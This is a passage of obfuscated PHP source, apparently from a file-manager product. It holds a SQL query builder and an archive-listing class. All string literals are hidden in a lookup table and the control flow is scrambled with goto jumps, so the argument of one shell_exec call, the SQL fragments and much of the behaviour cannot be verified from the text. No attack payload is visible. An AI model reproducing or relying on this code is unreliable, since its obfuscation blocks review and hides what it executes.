$aô¼ğçóØô .= $F ‹“Ì³ğğ[813] . $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $aÄĞ¬Ö æ»[1] . $F ‹“Ì³ğğ[930]; } elseif (preg_match($F ‹“Ì³ğğ[931], $aÄĞ¬Ö æ»[0])) { if (isset($aÄĞ¬Ö æ»[2]) && $F ‹“Ì³ğğ[281] == $aÄĞ¬Ö æ»[2]) { $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[50] . $aÄĞ¬Ö æ»[1]; } else { if (is_string($aÄĞ¬Ö æ»[1])) { $aÄĞ¬Ö æ»[1] = explode($F ‹“Ì³ğğ[47], $aÄĞ¬Ö æ»[1]); } $e„¥µ§Ü¦Õ = implode($F ‹“Ì³ğğ[47], $this->parseValue($aÄĞ¬Ö æ»[1])); $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[813] . $e„¥µ§Ü¦Õ . $F ‹“Ì³ğğ[815]; } } elseif (preg_match($F ‹“Ì³ğğ[932], $aÄĞ¬Ö æ»[0])) { $Câ‘ÅÏŒ´Á = is_string($aÄĞ¬Ö æ»[1]) ? explode($F ‹“Ì³ğğ[47], $aÄĞ¬Ö æ»[1]) : $aÄĞ¬Ö æ»[1]; $aô¼ğçóØô .= $F ‹“Ì³ğğ[813] . $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[50] . $this->parseValue($Câ‘ÅÏŒ´Á[0]) . $F ‹“Ì³ğğ[916] . $this->parseValue($Câ‘ÅÏŒ´Á[1]) . $F ‹“Ì³ğğ[262]; } else { think_exception(think_lang($F ‹“Ì³ğğ[919]) . $F ‹“Ì³ğğ[4] . $aÄĞ¬Ö æ»[0]); } } else { $dßè•¢ = count($aÄĞ¬Ö æ»); $câƒÚã„¤ß = isset($aÄĞ¬Ö æ»[$dßè•¢ - 1]) ? strtoupper($aÄĞ¬Ö æ»[$dßè•¢ - 1]) : $F ‹“Ì³ğğ[33]; if (in_array($câƒÚã„¤ß, array($F ‹“Ì³ğğ[913], $F ‹“Ì³ğğ[914], $F ‹“Ì³ğğ[915]))) { $dßè•¢ = $dßè•¢ - 1; } else { $câƒÚã„¤ß = $F ‹“Ì³ğğ[913]; } for ($Eğ¡ìêÙ«Ò = 0; $Eğ¡ìêÙ«Ò < $dßè•¢; $Eğ¡ìêÙ«Ò++) { $Câ‘ÅÏŒ´Á = is_array($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò]) ? $aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò][1] : $aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò]; if ($F ‹“Ì³ğğ[281] == strtolower($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò][0])) { $aô¼ğçóØô .= $F ‹“Ì³ğğ[244] . $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $Câ‘ÅÏŒ´Á . $F ‹“Ì³ğğ[930] . $câƒÚã„¤ß . $F ‹“Ì³ğğ[50]; } else { $a–ñÀì·œì = is_array($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò]) ? $this->exp[strtolower($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò][0])] : $F ‹“Ì³ğğ[905]; if (!$a–ñÀì·œì && is_array($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò]) && in_array($aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò][0], array($F ‹“Ì³ğğ[905], $F ‹“Ì³ğğ[923], $F ‹“Ì³ğğ[924], $F ‹“Ì³ğğ[925], $F ‹“Ì³ğğ[926], $F ‹“Ì³ğğ[927]))) { $a–ñÀì·œì = $aÄĞ¬Ö æ»[$Eğ¡ìêÙ«Ò][0]; } $aô¼ğçóØô .= $F ‹“Ì³ğğ[244] . $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $a–ñÀì·œì . $F ‹“Ì³ğğ[50] . $this->parseValue($Câ‘ÅÏŒ´Á) . $F ‹“Ì³ğğ[930] . $câƒÚã„¤ß . $F ‹“Ì³ğğ[50]; } } $aô¼ğçóØô = substr($aô¼ğçóØô, 0, -4); } } else { $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[933] . $this->parseValue($aÄĞ¬Ö æ»); } return $aô¼ğçóØô; } protected function parseThinkWhere($Cº»–µÉÅ‚, $EÚ–…³Úìä) { $C«™·÷÷ğŞ =& $_SERVER[Ìó]; $B„‰†Çä­£ = $C«™·÷÷ğŞ[33]; switch ($Cº»–µÉÅ‚) { case $C«™·÷÷ğŞ[335]: $B„‰†Çä­£ = $EÚ–…³Úìä; break; case $C«™·÷÷ğŞ[917]: $B„‰†Çä­£ = is_string($EÚ–…³Úìä) ? $EÚ–…³Úìä : substr($this->parseWhere($EÚ–…³Úìä), 6); break; case $C«™·÷÷ğŞ[934]: parse_str($EÚ–…³Úìä, $eÜ‹Šƒ›¹); if (isset($eÜ‹Šƒ›¹[$C«™·÷÷ğŞ[912]])) { $Bøºœ¿ÅÌ½ = $C«™·÷÷ğŞ[50] . strtoupper($eÜ‹Šƒ›¹[$C«™·÷÷ğŞ[912]]) . $C«™·÷÷ğŞ[50]; unset($eÜ‹Šƒ›¹[$C«™·÷÷ğŞ[912]]); } else { $Bøºœ¿ÅÌ½ = $C«™·÷÷ğŞ[916]; } $A„ÑÖ±æÃ = array(); foreach ($eÜ‹Šƒ›¹ as $E•‚à¢ÇŠ => $AÕÚË½æã¼) { $A„ÑÖ±æÃ[] = $this->parseKey($E•‚à¢ÇŠ) . $C«™·÷÷ğŞ[933] . $this->parseValue($AÕÚË½æã¼); } $B„‰†Çä­£ = implode($Bøºœ¿ÅÌ½, $A„ÑÖ±æÃ); break; } return $B„‰†Çä­£; } protected function parseLimit($dŒÕ˜õ×ô¡) { $EÅæ¢À˜‡§ =& $_SERVER[Ìó]; return !empty($dŒÕ˜õ×ô¡) ? $EÅæ¢À˜‡§[48] . $dŒÕ˜õ×ô¡ . $EÅæ¢À˜‡§[50] : $EÅæ¢À˜‡§[33]; } protected function parseJoin($cˆŸâ¬ºÓ‡) { $BÕ˜ÑÃÍ­£ =& $_SERVER[Ìó]; $B¥…¡¥ÀØ = $BÕ˜ÑÃÍ­£[33]; if (!empty($cˆŸâ¬ºÓ‡)) { if (is_array($cˆŸâ¬ºÓ‡)) { foreach ($cˆŸâ¬ºÓ‡ as $Cæ¤ğ§Êğ => $dá±„§îÔˆ) { if (!1 !== stripos($dá±„§îÔˆ, $BÕ˜ÑÃÍ­£[935])) { $B¥…¡¥ÀØ .= $BÕ˜ÑÃÍ­£[50] . $dá±„§îÔˆ; } else { $B¥…¡¥ÀØ .= $BÕ˜ÑÃÍ­£[936] . $dá±„§îÔˆ; } } } else { $B¥…¡¥ÀØ .= $BÕ˜ÑÃÍ­£[936] . $cˆŸâ¬ºÓ‡; } } $B¥…¡¥ÀØ = preg_replace($BÕ˜ÑÃÍ­£[937], think_config($BÕ˜ÑÃÍ­£[840]) . $BÕ˜ÑÃÍ­£[938], $B¥…¡¥ÀØ); return $B¥…¡¥ÀØ; } protected function parseOrder($a¦¤Ğëºç) { $E°±¥†®ªË =& $_SERVER[Ìó]; if (is_array($a¦¤Ğëºç)) { $A ßóËµ¯‹ = array(); foreach ($a¦¤Ğëºç as $aó’Ö±¿Ë => $c’–„Œ…ÁŠ) { if (is_numeric($aó’Ö±¿Ë)) { $A ßóËµ¯‹[] = $this->parseKey($c’–„Œ…ÁŠ); } else { $c’–„Œ…ÁŠ = in_array(strtoupper(trim($c’–„Œ…ÁŠ)), array($E°±¥†®ªË[939], $E°±¥†®ªË[940])) ? $E°±¥†®ªË[50] . $c’–„Œ…ÁŠ : $E°±¥†®ªË[33]; if (preg_match($E°±¥†®ªË[941], $aó’Ö±¿Ë)) { $A ßóËµ¯‹[] = $this->parseKey($aó’Ö±¿Ë) . $c’–„Œ…ÁŠ; } else { think_exception($E°±¥†®ªË[942] . $aó’Ö±¿Ë); } } } $a¦¤Ğëºç = implode($E°±¥†®ªË[47], $A ßóËµ¯‹); } return !empty($a¦¤Ğëºç) ? $E°±¥†®ªË[943] . $a¦¤Ğëºç : $E°±¥†®ªË[33]; } protected function parseGroup($b—®¨ùÎ–ã) { $AØ¾Å“óšŸ =& $_SERVER[Ìó]; return !empty($b—®¨ùÎ–ã) ? $AØ¾Å“óšŸ[944] . $b—®¨ùÎ–ã : $AØ¾Å“óšŸ[33]; } protected function parseHaving($F†×öËí­) { $fÕé•Èàè =& $_SERVER[Ìó]; return !empty($F†×öËí­) ? $fÕé•Èàè[945] . $F†×öËí­ : $fÕé•Èàè[33]; } protected function parseComment($A¶çğßí) { $F´æƒÖòŸå =& $_SERVER[Ìó]; return !empty($A¶çğßí) ? $F´æƒÖòŸå[946] . $A¶çğßí . $F´æƒÖòŸå[947] : $F´æƒÖòŸå[33]; } protected function parseDistinct($B¿íëíÙ®) { $FÊĞœ—¤Ù” =& $_SERVER[Ìó]; return !empty($B¿íëíÙ®) ? $FÊĞœ—¤Ù”[948] : $FÊĞœ—¤Ù”[33]; } protected function parseUnion($b¹º¤ß Â) { $a×¹£”é =& $_SERVER[Ìó]; if (empty($b¹º¤ß Â)) { return $a×¹£”é[33]; } if (isset($b¹º¤ß Â[$a×¹£”é[332]])) { $e—÷èŸ = $a×¹£”é[949]; unset($b¹º¤ß Â[$a×¹£”é[332]]); } else { $e—÷èŸ = $a×¹£”é[950]; } foreach ($b¹º¤ß Â as $cíÂ¡ßŠèë) { $bËšÊÃÌââ[] = $e—÷èŸ . (is_array($cíÂ¡ßŠèë) ? $this->buildSelectSql($cíÂ¡ßŠèë) : $cíÂ¡ßŠèë); } return implode($a×¹£”é[50], $bËšÊÃÌââ); } public function insert($b­ë×¼ğì˜, $CïÙÏ‡õ = array(), $d„—²‡Æ±„ = false) { goto cùÅÀÎªõ‰; cùÅÀÎªõ‰: $B¤”ÕîÌğõ =& $_SERVER[Ìó]; $C¹ÒŒÃñĞ‰ = $D¡Ğš¾ù¿ = array(); $this->model = $CïÙÏ‡õ[$B¤”ÕîÌğõ[265]]; goto F”Õºù†Ç; aØ‹›‚§­: $Eïœ¹§Œí– .= $this->parseComment(!empty($CïÙÏ‡õ[$B¤”ÕîÌğõ[337]]) ? $CïÙÏ‡õ[$B¤”ÕîÌğõ[337]] : $B¤”ÕîÌğõ[33]); return $this->execute($Eïœ¹§Œí–, $this->parseBind(!empty($CïÙÏ‡õ[$B¤”ÕîÌğõ[269]]) ? $CïÙÏ‡õ[$B¤”ÕîÌğõ[269]] : array())); goto aƒ¼ªÙÃÔ‚; F”Õºù†Ç: foreach ($b­ë×¼ğì˜ as $eì…Ô‚ç° => $B•ˆµÈîÒØ) { if (is_array($B•ˆµÈîÒØ) && $B¤”ÕîÌğõ[281] == $B•ˆµÈîÒØ[0]) { $D¡Ğš¾ù¿[] = $this->parseKey($eì…Ô‚ç°); $C¹ÒŒÃñĞ‰[] = $B•ˆµÈîÒØ[1]; } elseif (is_scalar($B•ˆµÈîÒØ) || is_null($B•ˆµÈîÒØ)) { $D¡Ğš¾ù¿[] = $this->parseKey($eì…Ô‚ç°); $C¹ÒŒÃñĞ‰[] = $this->parseValue($B•ˆµÈîÒØ); } } $Eïœ¹§Œí– = ($d„—²‡Æ±„ ? $B¤”ÕîÌğõ[817] : $B¤”ÕîÌğõ[818]) . $B¤”ÕîÌğõ[819] . $this->parseTable($CïÙÏ‡õ[$B¤”ÕîÌğõ[263]]) . $B¤”ÕîÌğõ[813] . implode($B¤”ÕîÌğõ[47], $D¡Ğš¾ù¿) . $B¤”ÕîÌğõ[814] . implode($B¤”ÕîÌğõ[47], $C¹ÒŒÃñĞ‰) . $B¤”ÕîÌğõ[815]; $Eïœ¹§Œí– .= $this->parseLock(isset($CïÙÏ‡õ[$B¤”ÕîÌğõ[766]]) ? $CïÙÏ‡õ[$B¤”ÕîÌğõ[766]] : !1); goto aØ‹›‚§­; aƒ¼ªÙÃÔ‚: } public function selectInsert($eÇ÷×ƒ±Ä¹, $dÌ¯Áç¾½ø, $D¿’ƒ¦¢­á = array()) { goto CŞ†§ğ‹; CŞ†§ğ‹: $AÂÍÁ´•¾ =& $_SERVER[Ìó]; $this->model = $D¿’ƒ¦¢­á[$AÂÍÁ´•¾[265]]; if (is_string($eÇ÷×ƒ±Ä¹)) { $eÇ÷×ƒ±Ä¹ = explode($AÂÍÁ´•¾[47], $eÇ÷×ƒ±Ä¹); } goto aç§Ø‘; aç§Ø‘: array_walk($eÇ÷×ƒ±Ä¹, array($this, $AÂÍÁ´•¾[816])); $AèÉõ‹†­É = $AÂÍÁ´•¾[951] . $this->parseTable($dÌ¯Áç¾½ø) . $AÂÍÁ´•¾[813] . implode($AÂÍÁ´•¾[47], $eÇ÷×ƒ±Ä¹) . $AÂÍÁ´•¾[930]; $AèÉõ‹†­É .= $this->buildSelectSql($D¿’ƒ¦¢­á); goto b”Ÿ—çØ; b”Ÿ—çØ: return $this->execute($AèÉõ‹†­É, $this->parseBind(!empty($D¿’ƒ¦¢­á[$AÂÍÁ´•¾[269]]) ? $D¿’ƒ¦¢­á[$AÂÍÁ´•¾[269]] : array())); goto CĞóêäÒçÊ; CĞóêäÒçÊ: } public function update($DÇâ¼±¬×Ç, $CÄ†  †) { $D±ù‰½—ö =& $_SERVER[Ìó]; $this->model = $CÄ†  †[$D±ù‰½—ö[265]]; $D˜²²ìëçË = $D±ù‰½—ö[952] . $this->parseTable($CÄ†  †[$D±ù‰½—ö[263]]) . $this->parseSet($DÇâ¼±¬×Ç) . $this->parseWhere(!empty($CÄ†  †[$D±ù‰½—ö[259]]) ? $CÄ†  †[$D±ù‰½—ö[259]] : $D±ù‰½—ö[33]) . $this->parseOrder(!empty($CÄ†  †[$D±ù‰½—ö[346]]) ? $CÄ†  †[$D±ù‰½—ö[346]] : $D±ù‰½—ö[33]) . $this->parseLimit(!empty($CÄ†  †[$D±ù‰½—ö[276]]) ? $CÄ†  †[$D±ù‰½—ö[276]] : $D±ù‰½—ö[33]) . $this->parseLock(isset($CÄ†  †[$D±ù‰½—ö[766]]) ? $CÄ†  †[$D±ù‰½—ö[766]] : !1) . $this->parseComment(!empty($CÄ†  †[$D±ù‰½—ö[337]]) ? $CÄ†  †[$D±ù‰½—ö[337]] : $D±ù‰½—ö[33]); return $this->execute($D˜²²ìëçË, $this->parseBind(!empty($CÄ†  †[$D±ù‰½—ö[269]]) ? $CÄ†  †[$D±ù‰½—ö[269]] : array())); } public function delete($C°È†¼Ëê = array()) { $f·’—ç‚ß¹ =& $_SERVER[Ìó]; $this->model = $C°È†¼Ëê[$f·’—ç‚ß¹[265]]; $b‘¼‚˜Å¤ = $f·’—ç‚ß¹[953] . $this->parseTable($C°È†¼Ëê[$f·’—ç‚ß¹[263]]) . $this->parseWhere(!empty($C°È†¼Ëê[$f·’—ç‚ß¹[259]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[259]] : $f·’—ç‚ß¹[33]) . $this->parseOrder(!empty($C°È†¼Ëê[$f·’—ç‚ß¹[346]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[346]] : $f·’—ç‚ß¹[33]) . $this->parseLimit(!empty($C°È†¼Ëê[$f·’—ç‚ß¹[276]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[276]] : $f·’—ç‚ß¹[33]) . $this->parseLock(isset($C°È†¼Ëê[$f·’—ç‚ß¹[766]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[766]] : !1) . $this->parseComment(!empty($C°È†¼Ëê[$f·’—ç‚ß¹[337]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[337]] : $f·’—ç‚ß¹[33]); return $this->execute($b‘¼‚˜Å¤, $this->parseBind(!empty($C°È†¼Ëê[$f·’—ç‚ß¹[269]]) ? $C°È†¼Ëê[$f·’—ç‚ß¹[269]] : array())); } public function select($fÁœ‘‚ ß = array()) { goto BÂ×ÛêÚ­; BÌÌŠ‹Ï™: if ($Aù“õ–ËÃ && !1 !== $A‡„Î˜­……) { think_cache($bÀÌ•ç—Ù, $A‡„Î˜­……, $Aù“õ–ËÃ); } return $A‡„Î˜­……; goto B²ˆ† ˜¢¾; E¨˜ºˆÎµ£: $Aù“õ–ËÃ = isset($fÁœ‘‚ ß[$dÈ‹ñ‰¸‹À[333]]) ? $fÁœ‘‚ ß[$dÈ‹ñ‰¸‹À[333]] : !1; if ($Aù“õ–ËÃ) { $bÀÌ•ç—Ù = is_string($Aù“õ–ËÃ[$dÈ‹ñ‰¸‹À[89]]) ? $Aù“õ–ËÃ[$dÈ‹ñ‰¸‹À[89]] : $dÈ‹ñ‰¸‹À[954] . md5($dÄïÖ±ô); $FÜŸôµ ˜ô = think_cache($bÀÌ•ç—Ù, $dÈ‹ñ‰¸‹À[33], $Aù“õ–ËÃ); if (!1 !== $FÜŸôµ ˜ô) { return $FÜŸôµ ˜ô; } } $A‡„Î˜­…… = $this->query($dÄïÖ±ô, $this->parseBind(!empty($fÁœ‘‚ ß[$dÈ‹ñ‰¸‹À[269]]) ? $fÁœ‘‚ ß[$dÈ‹ñ‰¸‹À[269]] : array())); goto BÌÌŠ‹Ï™; BÂ×ÛêÚ­: $dÈ‹ñ‰¸‹À =& $_SERVER[Ìó]; $this->model = $fÁœ‘‚ ß[$dÈ‹ñ‰¸‹À[265]]; $dÄïÖ±ô = $this->buildSelectSql($fÁœ‘‚ ß); goto E¨˜ºˆÎµ£; B²ˆ† ˜¢¾: } public function buildSelectSql($d¯¸©ÂÎØ‡ = array()) { goto e‚£ƒªñ; e‚£ƒªñ: $Cœ›ÌŠóôî =& $_SERVER[Ìó]; if (isset($d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[336]])) { if (strpos($d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[336]], $Cœ›ÌŠóôî[47])) { list($Cä‘ÇÂô¼, $fÍÏ…¥á‰Â) = explode($Cœ›ÌŠóôî[47], $d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[336]]); } else { $Cä‘ÇÂô¼ = $d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[336]]; } $Cä‘ÇÂô¼ = $Cä‘ÇÂô¼ ? $Cä‘ÇÂô¼ : 1; $fÍÏ…¥á‰Â = isset($fÍÏ…¥á‰Â) ? $fÍÏ…¥á‰Â : (is_numeric($d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[276]]) ? $d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[276]] : 20); $A‡³˜êä = $fÍÏ…¥á‰Â * ((int) $Cä‘ÇÂô¼ - 1); $d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[276]] = $A‡³˜êä . $Cœ›ÌŠóôî[47] . $fÍÏ…¥á‰Â; } if (think_config($Cœ›ÌŠóôî[955])) { $eæñõÆ˜å = $Cœ›ÌŠóôî[956] . md5(serialize($d¯¸©ÂÎØ‡)); $D²…Á¤—öÊ = think_cache($eæñõÆ˜å); if ($D²…Á¤—öÊ) { return $D²…Á¤—öÊ; } } goto Cİ¢ÛÂ«ê; aÜ‹ææÌ®: return $D‰Êİãò¶; goto C·–¨âÚ¬»; Cİ¢ÛÂ«ê: $D‰Êİãò¶ = $this->parseSql($this->selectSql, $d¯¸©ÂÎØ‡); $D‰Êİãò¶ .= $this->parseLock(isset($d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[766]]) ? $d¯¸©ÂÎØ‡[$Cœ›ÌŠóôî[766]] : !1); if (isset($eæñõÆ˜å)) { think_cache($eæñõÆ˜å, $D‰Êİãò¶); } goto aÜ‹ææÌ®; C·–¨âÚ¬»: } public function parseSql($fö×ÖÎ‡¬Š, $B”¾¼§´È = array()) { $fğåÀ¢Ìù± =& $_SERVER[Ìó]; $fö×ÖÎ‡¬Š = str_replace(array($fğåÀ¢Ìù±[957], $fğåÀ¢Ìù±[958], $fğåÀ¢Ìù±[959], $fğåÀ¢Ìù±[960], $fğåÀ¢Ìù±[961], $fğåÀ¢Ìù±[962], $fğåÀ¢Ìù±[963], $fğåÀ¢Ìù±[964], $fğåÀ¢Ìù±[965], $fğåÀ¢Ìù±[966], $fğåÀ¢Ìù±[967]), array($this->parseTable("{$B”¾¼§´È[$fğåÀ¢Ìù±[263]]}"), $this->parseDistinct(isset($B”¾¼§´È[$fğåÀ¢Ìù±[968]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[968]] : !1), $this->parseField(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[257]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[257]] : $fğåÀ¢Ìù±[172]), $this->parseJoin(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[266]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[266]] : $fğåÀ¢Ìù±[33]), $this->parseWhere(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[259]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[259]] : $fğåÀ¢Ìù±[33]), $this->parseGroup(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[969]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[969]] : $fğåÀ¢Ìù±[33]), $this->parseHaving(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[970]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[970]] : $fğåÀ¢Ìù±[33]), $this->parseOrder(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[346]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[346]] : $fğåÀ¢Ìù±[33]), $this->parseLimit(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[276]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[276]] : $fğåÀ¢Ìù±[33]), $this->parseUnion(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[331]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[331]] : $fğåÀ¢Ìù±[33]), $this->parseComment(!empty($B”¾¼§´È[$fğåÀ¢Ìù±[337]]) ? $B”¾¼§´È[$fğåÀ¢Ìù±[337]] : $fğåÀ¢Ìù±[33])), $fö×ÖÎ‡¬Š); return $fö×ÖÎ‡¬Š; } public function getLastSql($aàø©óà÷ª = '') { return $aàø©óà÷ª ? $this->modelSql[$aàø©óà÷ª] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($C°ÈØˆ˜ñğ) { return addslashes($C°ÈØˆ˜ñğ); } public function setModel($Dã²à¸Ü£¦) { $this->model = $Dã²à¸Ü£¦; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } $BŒÖÄÉÄ¦ª = LIB_DIR . $_SERVER[Ìó][794]; $e¦¡ÆéÌÒò = $_SERVER[Ìó][795]; goto b÷óÔÈ¥¤œ; bŠğ®¿’À¹: class KodArchive { static function init() { goto B¿—¶ÀÈ„÷; B¿—¶ÀÈ„÷: $bì¢éÆ„§ =& $_SERVER[Ìó]; if (defined($bì¢éÆ„§[1854])) { return; } define($bì¢éÆ„§[1854], SDK_DIR . $bì¢éÆ„§[1855]); goto Ağ¯†µ·Ä; få¢Üñô†±: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $bì¢éÆ„§[1860]; require_once ARCHIVE_LIB . $bì¢éÆ„§[1861]; goto eˆ¦•ñù°İ; Ağ¯†µ·Ä: define($bì¢éÆ„§[1856], TEMP_FILES); define($bì¢éÆ„§[1857], TEMP_FILES); define($bì¢éÆ„§[1858], $bì¢éÆ„§[1859]); goto få¢Üñô†±; B÷†ŞéƒŒ‘: require_once ARCHIVE_LIB . $bì¢éÆ„§[1865]; goto c‹ —ä à•; eˆ¦•ñù°İ: require_once ARCHIVE_LIB . $bì¢éÆ„§[1862]; require_once ARCHIVE_LIB . $bì¢éÆ„§[1863]; require_once ARCHIVE_LIB . $bì¢éÆ„§[1864]; goto B÷†ŞéƒŒ‘; c‹ —ä à•: } static function checkIfType($d‘õÒÊÖ«, $c•½½òÙ·§) { goto EËï¶¤‰¬¯; EËï¶¤‰¬¯: $Fƒ˜ğÎñˆÜ =& $_SERVER[Ìó]; self::init(); $E¾âĞŞÕ×» = array($Fƒ˜ğÎñˆÜ[297] => array($Fƒ˜ğÎñˆÜ[297], $Fƒ˜ğÎñˆÜ[1866], $Fƒ˜ğÎñˆÜ[1867], $Fƒ˜ğÎñˆÜ[1868]), $Fƒ˜ğÎñˆÜ[1869] => array($Fƒ˜ğÎñˆÜ[1869], $Fƒ˜ğÎñˆÜ[1870], $Fƒ˜ğÎñˆÜ[1039], $Fƒ˜ğÎñˆÜ[1037]), $Fƒ˜ğÎñˆÜ[1041] => array($Fƒ˜ğÎñˆÜ[1041], $Fƒ˜ğÎñˆÜ[1871], $Fƒ˜ğÎñˆÜ[1872], $Fƒ˜ğÎñˆÜ[1873], $Fƒ˜ğÎñˆÜ[1874], $Fƒ˜ğÎñˆÜ[1875], $Fƒ˜ğÎñˆÜ[1876])); goto BÚ¼‘˜©Ş“; dïÚ’øÑ¥Á: return $E…‰éÍ«‰õ; goto AìÑîØ°İ; BÚ¼‘˜©Ş“: $E…‰éÍ«‰õ = in_array($d‘õÒÊÖ«, $E¾âĞŞÕ×»[$c•½½òÙ·§]); if ($E…‰éÍ«‰õ && ($c•½½òÙ·§ == $Fƒ˜ğÎñˆÜ[297] || $c•½½òÙ·§ == $Fƒ˜ğÎñˆÜ[1869]) && (!function_exists($Fƒ˜ğÎñˆÜ[1877]) || !function_exists($Fƒ˜ğÎñˆÜ[1878]))) { show_tips($Fƒ˜ğÎñˆÜ[1879]); } if ($E…‰éÍ«‰õ && $c•½½òÙ·§ == $Fƒ˜ğÎñˆÜ[1041] && (!function_exists($Fƒ˜ğÎñˆÜ[1880]) || !strstr(shell_exec($Fƒ˜ğÎñˆÜ[1881]), $Fƒ˜ğÎñˆÜ[1882]))) { show_tips($Fƒ˜ğÎñˆÜ[1883]); } goto dïÚ’øÑ¥Á; AìÑîØ°İ: } static function listContent($D…ÖÎÃó, $d‘ãŠ×ê¦õ = true) { $A‡ÒÖµ‚æ‡ =& $_SERVER[Ìó]; self::init(); $bÖ¿¸ŠÚÆ° = !empty($GLOBALS[$A‡ÒÖµ‚æ‡[1045]]) ? $GLOBALS[$A‡ÒÖµ‚æ‡[1045]] : get_path_ext($D…ÖÎÃó); $B¿ãƒ‹½¼ì = !1; if (self::checkIfType($bÖ¿¸ŠÚÆ°, $A‡ÒÖµ‚æ‡[1869])) { $eÊòÉ§Ùî† = PclTarList($D…ÖÎÃó, $bÖ¿¸ŠÚÆ°); $B¿ãƒ‹½¼ì = array(); for ($a¤óËä†¹Ã = 0; $a¤óËä†¹Ã < count($eÊòÉ§Ùî†); $a¤óËä†¹Ã++) { $få„ÓÊËô¤ = $eÊòÉ§Ùî†[$a¤óËä†¹Ã]; if ($få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1884]] == $A‡ÒÖµ‚æ‡[1885] || $få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1884]] == $A‡ÒÖµ‚æ‡[1886]) { continue; } if ($d‘ãŠ×ê¦õ) { $få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1887]] = ltrim($få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1887]], $A‡ÒÖµ‚æ‡[1143]); } if ($få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1884]] == $A‡ÒÖµ‚æ‡[1888]) { $få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[76]] = !0; } else { $få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[76]] = !1; } $få„ÓÊËô¤[$A‡ÒÖµ‚æ‡[1032]] = $a¤óËä†¹Ã; $B¿ãƒ‹½¼ì[] = $få„ÓÊËô¤; } } else { if (self::checkIfType($bÖ¿¸ŠÚÆ°, $A‡ÒÖµ‚æ‡[1041])) { $D£áÙ´Òİò = kodRarArchive::listContent($D…ÖÎÃó); if (!$D£áÙ´Òİò[$A‡ÒÖµ‚æ‡[1028]]) { return $D£áÙ´Òİò; } else { $B¿ãƒ‹½¼ì = $D£áÙ´Òİò[$A‡ÒÖµ‚æ‡[1030]]; } } else { if (kodZipArchive::support($A‡ÒÖµ‚æ‡[350])) { $B¿ãƒ‹½¼ì = kodZipArchive::listContent($D…ÖÎÃó); } else { $b‹ÖèÔ£¢Ü = new PclZip($D…ÖÎÃó); $B¿ãƒ‹½¼ì = $b‹ÖèÔ£¢Ü->listContent(); } } } if ($B¿ãƒ‹½¼ì) { $E‚å£¨ß‘Ù = unzip_charset_get($B¿ãƒ‹½¼ì); $d‘ãŠ×ê¦õ = $d‘ãŠ×ê¦õ && function_exists($A‡ÒÖµ‚æ‡[65]); for ($a¤óËä†¹Ã = 0; $a¤óËä†¹Ã < count($B¿ãƒ‹½¼ì); $a¤óËä†¹Ã++) { $B¿ãƒ‹½¼ì[$a¤óËä†¹Ã][$A‡ÒÖµ‚æ‡[1887]] = str_replace(array($A‡ÒÖµ‚æ‡[1068], $A‡ÒÖµ‚æ‡[1889]), $A‡ÒÖµ‚æ‡[758], $B¿ãƒ‹½¼ì[$a¤óËä†¹Ã][$A‡ÒÖµ‚æ‡[1887]]); if ($d‘ãŠ×ê¦õ) { $B¿ãƒ‹½¼ì[$a¤óËä†¹Ã][$A‡ÒÖµ‚æ‡[1887]] = iconv_to($B¿ãƒ‹½¼ì[$a¤óËä†¹Ã][$A‡ÒÖµ‚æ‡[1887]], $E‚å£¨ß‘Ù, $A‡ÒÖµ‚æ‡[322]); 